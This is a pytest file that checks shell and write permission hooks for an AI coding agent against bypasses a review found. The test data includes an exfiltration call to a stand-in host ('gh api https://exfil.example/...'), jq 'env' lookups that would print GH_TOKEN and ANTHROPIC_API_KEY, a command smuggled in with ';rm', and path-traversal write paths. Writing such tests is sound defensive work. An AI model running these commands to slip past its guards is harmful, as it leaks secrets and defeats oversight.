"""T15 fix round 1: one failing test per reviewed bypass (I-1 .. I-5, M-1 .. M-3).

Each payload below came from ``task-T15-review.md`` and was ALLOWED by the first
version of the guards. They run against the same scripts as the other guard tests and
honour the same ``CIV6AZ_TEST_*_GUARD`` overrides, so the negative control (point them
at an allow-everything script) fails every deny test here too.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[2]
_HOOKS = REPO_ROOT / ".claude" / "hooks"
READONLY_GUARD = Path(
    os.environ.get("CIV6AZ_TEST_READONLY_GUARD", str(_HOOKS / "readonly_shell_guard.sh"))
)
WRITE_GUARD = Path(
    os.environ.get("CIV6AZ_TEST_WRITE_GUARD", str(_HOOKS / "tests_only_write_guard.sh"))
)
BASH = shutil.which("bash") or "bash"

pytestmark = pytest.mark.skipif(
    not any(shutil.which(t) for t in ("jq", "python3", "python")),
    reason="guards need jq or python on PATH",
)


def _decide(script: Path, raw: str, *args: str) -> str | None:
    proc = subprocess.run(
        [BASH, script.as_posix(), *args],
        cwd=REPO_ROOT,
        input=raw,
        capture_output=True,
        text=True,
        timeout=30,
        check=False,
    )
    assert proc.returncode == 0, proc.stderr
    if not proc.stdout.strip():
        return None
    return str(json.loads(proc.stdout)["hookSpecificOutput"]["permissionDecision"])


def ro(command: str) -> str | None:
    return _decide(READONLY_GUARD, json.dumps({"tool_input": {"command": command}}))


def qa(command: str) -> str | None:
    return _decide(READONLY_GUARD, json.dumps({"tool_input": {"command": command}}), "--qa")


# --- I-1: exact script allowlist, case-variant names ---------------------------

ALLOWED_SCRIPTS = [
    "validate_agents",
    "validate_claude_agents",
    "validate_kb",
    "validate_openspec",
    "validate_skills",
    "check_doc_sync",
    "check_coverage_floors",
    "check_branch_direction",
    "check_learning_trend",
    "verify_release_evidence",
]


@pytest.mark.parametrize("name", ALLOWED_SCRIPTS)
def test_i1_each_vetted_script_is_allowed(name: str) -> None:
    assert ro(f"python scripts/{name}.py") is None


@pytest.mark.parametrize(
    "command",
    [
        "python scripts/check_BUILD.py",
        "python scripts/Check_Build.py",
        "python scripts/check_build.py",
        "python scripts/validate_GCP_credentials.py",
        "python scripts/validate_gcp_credentials.py",
        "python scripts/validate_Convergence.py --iterations 1000 --games 1000",
        "python scripts/validate_convergence.py",
        "python scripts/check_DOC_sync.py",
        "python scripts/check_doc_sync.PY",
        "python scripts/check_anything_else.py",
        "python scripts/validate_new_thing.py",
        "python scripts/verify_release_evidence2.py",
    ],
)
def test_i1_excluded_and_unlisted_scripts_are_denied_in_any_case(command: str) -> None:
    assert ro(command) == "deny"
    assert qa(command) == "deny"


# --- I-2: qa mode ----------------------------------------------------------------

QA_ALLOWED = [
    "python -m pytest tests/unit/test_x.py",
    "python -m pytest tests/unit/test_x.py -q -x",
    "python3 -m pytest tests/governance -q --tb=short",
    "python -m pytest tests/unit/test_x.py::test_a -k plain_word -m slow",
    "python -m pytest tests/a tests/b -p no:cacheprovider --maxfail=3",
    "python -m pytest tests/governance --confcutdir=tests/governance",
    "OMP_NUM_THREADS=2 python -m pytest tests/unit/test_x.py -q",
    "py -m pytest tests/unit",
    "git log --oneline -3",
    "gh pr view 3 --json state",
    "python scripts/validate_kb.py",
]

QA_DENIED = [
    "python -c print(1)",
    "python -m pytest",
    "python -m pytest alpha_zero/",
    "python -m pytest tests/../alpha_zero",
    "python -m pytest ../tests/x.py",
    "python -m pytest /tmp/tests/x.py",
    "python -m pytest tests/x.py --rootdir=/",
    "python -m pytest tests/x.py -p evil_plugin",
    "python -m pytest tests/x.py --basetemp=..",
    "python -m pytest tests/x.py -c /etc/x.ini",
    "python -m pytest tests/x.py --pyargs os",
    "python -m pytest tests/x.py --co-evil",
    "python -m pytest tests/x.py -k a;rm",
    "python -m pytest tests/x.py -k not_ok -m a b",
    "python -m pytest tests/x.py --junitxml=out.xml",
    "python -m pytest tests/x.py --cov=alpha_zero",
    "python -m pip install x",
    "python -m pytest tests/governance -c tests/governance/pytest.ini",
    "python -m pytest tests/governance -c tests/evil.ini",
    "python -m mypy alpha_zero",
    "git commit -m x",
    "git push origin HEAD",
    "git add .",
    "git checkout -b x",
    "gh pr comment 1 --body x",
    "OMP_NUM_THREADS=2 git commit -m x",
    "OMP_NUM_THREADS=2x python -m pytest tests/x.py",
    "FOO=1 python -m pytest tests/x.py",
    "OMP_NUM_THREADS=2 OMP_NUM_THREADS=2 python -m pytest tests/x.py",
    "OMP_NUM_THREADS= python -m pytest tests/x.py",
    "make verify",
    "pytest tests/x.py",
]


@pytest.mark.parametrize("command", QA_ALLOWED)
def test_i2_qa_mode_allows_pytest_under_tests_and_the_read_only_list(command: str) -> None:
    assert qa(command) is None, command


@pytest.mark.parametrize("command", QA_DENIED)
def test_i2_qa_mode_denies_everything_else(command: str) -> None:
    assert qa(command) == "deny", command


@pytest.mark.parametrize(
    "command",
    [
        "python -m pytest tests/unit/test_x.py",
        "OMP_NUM_THREADS=2 git log",
        "OMP_NUM_THREADS=2 python scripts/validate_kb.py",
    ],
)
def test_i2_read_only_mode_does_not_get_pytest_or_the_env_prefix(command: str) -> None:
    assert ro(command) == "deny"


def test_i2_unknown_mode_argument_denies() -> None:
    raw = json.dumps({"tool_input": {"command": "git log"}})
    assert _decide(READONLY_GUARD, raw, "--bogus") == "deny"


# --- I-4: gh api takes a relative API path only ------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "gh api https://exfil.example/leak/DATA",
        "gh api http://127.0.0.1:9/x",
        "gh api //host/x",
        "gh api //host",
        "gh api api.github.com:443/repos/o/r",
        "gh api repos/o/r:x",
        "gh api --hostname exfil.example repos/o/r",
        "gh api ftp://x/y",
        "gh api repos//o",
        "gh api repos/o/r/",
        "gh api",
    ],
)
def test_i4_gh_api_rejects_urls_and_hosts(command: str) -> None:
    assert ro(command) == "deny"
    assert qa(command) == "deny"


@pytest.mark.parametrize(
    "command",
    ["gh api repos/o/r/pulls/1", "gh api /repos/o/r", "gh api rate_limit", "gh api user"],
)
def test_i4_gh_api_relative_paths_still_work(command: str) -> None:
    assert ro(command) is None


# --- I-5: a payload with no string command is denied -------------------------------

BAD_PAYLOADS = [
    "null",
    '"git push"',
    "[1,2]",
    '{"tool_name":"Bash"}',
    '{"tool_input":null}',
    '{"tool_input":"git push"}',
    '{"tool_input":{"cmd":"git push"}}',
    '{"tool_input":{"command":null}}',
    '{"tool_input":{"command":false}}',
    '{"tool_input":{"command":5}}',
    '{"tool_input":{"command":["git","push"]}}',
    '{"tool_input":{}}',
]


@pytest.mark.parametrize("raw", BAD_PAYLOADS)
def test_i5_payload_without_a_string_command_is_denied(raw: str) -> None:
    assert _decide(READONLY_GUARD, raw) == "deny"
    assert _decide(READONLY_GUARD, raw, "--qa") == "deny"


def test_i5_whitespace_only_string_command_still_runs_nothing() -> None:
    assert ro("   ") is None


# --- M-1: jq `env` would print secrets --------------------------------------------


@pytest.mark.parametrize(
    "command",
    [
        "gh api repos/o/r -q env.GH_TOKEN",
        "gh api repos/o/r --jq env.ANTHROPIC_API_KEY",
        "gh api repos/o/r --jq=env.GH_TOKEN",
        "gh api repos/o/r -q .a.env.B",
        "gh pr view 1 --jq env.HOME",
        "gh pr view 1 --jq=env.HOME",
        "gh pr list -q env",
    ],
)
def test_m1_jq_env_is_denied(command: str) -> None:
    assert ro(command) == "deny"


def test_m1_plain_jq_fields_still_work() -> None:
    assert ro("gh api repos/o/r -q .name") is None
    assert ro("gh api repos/o/r --jq=.owner.login") is None
    assert ro("gh pr view 1 --json state -q .state") is None


# --- M-2: python script options -----------------------------------------------------


@pytest.mark.parametrize(
    "option",
    [
        "--write-baseline",
        "--output-dir=x",
        "--update-baseline",
        "--save-report",
        "--dump=x",
        "--create",
        "--delete",
        "--force",
        "--overwrite",
        "--baseline",
        "-o",
        "-w",
        "-f",
    ],
)
def test_m2_writing_looking_script_options_are_denied(option: str) -> None:
    assert ro(f"python scripts/check_doc_sync.py {option}") == "deny"


@pytest.mark.parametrize(
    "command",
    [
        "python scripts/check_doc_sync.py --quiet",
        "python scripts/check_doc_sync.py --json --quiet",
        "python scripts/validate_kb.py --git --path kb/x.md",
        "python scripts/validate_agents.py --max-warnings 22",
        "python scripts/validate_claude_agents.py --verbose --path .claude/agents/sdlc-architect.md",
        "python scripts/verify_release_evidence.py --scope",
        "python scripts/check_coverage_floors.py -v",
        "python scripts/check_doc_sync.py -h",
        "python scripts/check_doc_sync.py --help",
    ],
)
def test_m2_exact_vetted_options_are_allowed(command: str) -> None:
    assert ro(command) is None, command


@pytest.mark.parametrize(
    "command",
    [
        # argparse accepts unambiguous abbreviations: --wr is --write, --fi is --fix.
        "python scripts/check_learning_trend.py --ou x",
        "python scripts/check_learning_trend.py --out=x",
        "python scripts/check_learning_trend.py --o x",
        "python scripts/check_doc_sync.py --wr",
        "python scripts/check_doc_sync.py --wri",
        "python scripts/check_doc_sync.py --fi",
        "python scripts/check_doc_sync.py --upd",
        "python scripts/check_doc_sync.py --write-b",
        "python scripts/check_doc_sync.py --qui",
        "python scripts/check_doc_sync.py --js",
        "python scripts/validate_kb.py --pat x",
        "python scripts/validate_kb.py --verbose",
        "python scripts/check_doc_sync.py --git",
        "python scripts/check_branch_direction.py --quiet",
        "python scripts/validate_skills.py -q",
        "python scripts/verify_release_evidence.py --repo-roo x",
    ],
)
def test_m2_abbreviations_and_unlisted_options_are_denied(command: str) -> None:
    assert ro(command) == "deny", command
    assert qa(command) == "deny", command


# --- M-3: write guard dot/space segments --------------------------------------------


def _write(path: str) -> str | None:
    raw = json.dumps({"tool_input": {"file_path": path}})
    env = dict(os.environ, CLAUDE_PROJECT_DIR=REPO_ROOT.as_posix())
    proc = subprocess.run(
        [BASH, WRITE_GUARD.as_posix()],
        cwd=REPO_ROOT,
        input=raw,
        env=env,
        capture_output=True,
        text=True,
        timeout=30,
        check=False,
    )
    assert proc.returncode == 0, proc.stderr
    return (
        str(json.loads(proc.stdout)["hookSpecificOutput"]["permissionDecision"])
        if proc.stdout.strip()
        else None
    )


@pytest.mark.parametrize(
    "path",
    [
        "tests/.. /alpha_zero/x.py",
        "tests\\...\\alpha_zero\\x.py",
        "tests/..../x.py",
        "tests/.. ./x.py",
        "tests/..\t/x.py",
        "tests/. /x.py",
    ],
)
def test_m3_dot_and_space_segments_are_denied(path: str) -> None:
    assert _write(path) == "deny"


def test_m3_ordinary_test_paths_still_work() -> None:
    assert _write("tests/unit/test_x.py") is None
    assert _write("./tests/unit/test_x.py") is None
    assert _write("tests/unit/.hidden_fixture") is None
    assert _write("tests/unit/a.b.c.py") is None
